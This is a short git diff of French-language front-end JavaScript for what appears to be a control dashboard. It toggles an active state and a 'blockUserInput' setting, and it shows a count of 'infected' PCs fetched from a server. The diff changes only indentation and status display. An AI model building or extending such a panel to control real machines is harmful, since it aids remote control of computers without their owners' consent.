@@ -46,9 +46,9 @@ btnIsActive.addEventListener('click', function () {
 
 btnIntera.addEventListener("click", function() {
     isInteraActive = !isInteraActive
-     spaIntera.innerText = isInteraActive ? 'Actif' : 'Inactif';
-     spaIntera.className = isInteraActive ? 'fw-bold status-indicator actif' : 'fw-bold status-indicator inactif';
-     btnIntera.disabled = true;
+    spaIntera.innerText = isInteraActive ? 'Actif' : 'Inactif';
+    spaIntera.className = isInteraActive ? 'fw-bold status-indicator actif' : 'fw-bold status-indicator inactif';
+    btnIntera.disabled = true;
     const originalText = btnIntera.innerHTML;
     btnIntera.innerHTML = `<i class="fas fa-spinner fa-spin me-2"></i> Chargement...`;
 
@@ -201,8 +201,11 @@ function initialize() {
         .then(response => response.json())
         .then(data => {
             isActive = data.isActive;
+            isInteraActive = data.blockUserInput;
             SpaIsActive.innerText = isActive ? 'Actif' : 'Inactif';
+            spaIntera.innerText = isInteraActive ? 'Actif' : 'Inactif';
             SpaIsActive.className = isActive ? 'fw-bold status-indicator actif' : 'fw-bold status-indicator inactif';
+            spaIntera.className = isInteraActive ? 'fw-bold status-indicator actif' : 'fw-bold status-indicator inactif';
             SpaNbPcInfect.innerText = data.nbPcInfect ? data.nbPcInfect.nbPcInfect : '-';
             nbPcInfectIncr = data.nbPcInfect ? data.nbPcInfect.nbPcInfectIncr : 0;
             messageIncr = data.message ? data.message.incr : 0;
